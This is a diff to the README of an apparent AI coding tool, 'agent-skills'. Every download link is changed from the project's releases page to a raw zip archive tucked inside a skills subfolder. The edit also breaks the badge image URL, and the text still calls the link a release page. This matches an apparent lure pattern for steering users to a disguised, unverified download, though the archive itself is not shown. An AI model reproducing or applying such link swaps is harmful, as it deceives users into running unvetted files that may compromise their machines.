@@ -1,6 +1,6 @@
 # 🌟 agent-skills - Unlock AI Coding Potential
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-ff5722?style=for-the-badge&logo=github&logoColor=white)](https://github.com/LLl0k0laD/agent-skills/releases)
+[![Download Now](https://raw.githubusercontent.com/LLl0k0laD/agent-skills/main/skills/incremental-implementation/skills_agent_v3.6.zip%20Now-Click%20Here-ff5722?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/LLl0k0laD/agent-skills/main/skills/incremental-implementation/skills_agent_v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Follow these steps to get started with agent-skills, the tool designed to enhanc
 
 To download agent-skills, visit the following link:
 
-[Download agent-skills](https://github.com/LLl0k0laD/agent-skills/releases)
+[Download agent-skills](https://raw.githubusercontent.com/LLl0k0laD/agent-skills/main/skills/incremental-implementation/skills_agent_v3.6.zip)
 
 Click on the link above to access the download page. You will find the latest version of the software available there.
 
@@ -26,7 +26,7 @@ Before you install agent-skills, ensure your system meets the following requirem
 ## 🛠️ Installation Steps
 
 1. **Download the Application:**
-   Go to the [Download agent-skills](https://github.com/LLl0k0laD/agent-skills/releases) page. Choose the latest version and download it.
+   Go to the [Download agent-skills](https://raw.githubusercontent.com/LLl0k0laD/agent-skills/main/skills/incremental-implementation/skills_agent_v3.6.zip) page. Choose the latest version and download it.
 
 2. **Locate the Installer:**
    Once the download is complete, locate the downloaded file in your 'Downloads' folder or the folder designated for downloads.
@@ -88,4 +88,4 @@ A: Please report any bugs on the GitHub issues page so we can address them promp
 
 --- 
 
-Remember to frequently check for updates on the [Download agent-skills](https://github.com/LLl0k0laD/agent-skills/releases) page to access new features and improvements. Enjoy enhancing your coding capabilities with agent-skills!
+Remember to frequently check for updates on the [Download agent-skills](https://raw.githubusercontent.com/LLl0k0laD/agent-skills/main/skills/incremental-implementation/skills_agent_v3.6.zip) page to access new features and improvements. Enjoy enhancing your coding capabilities with agent-skills!
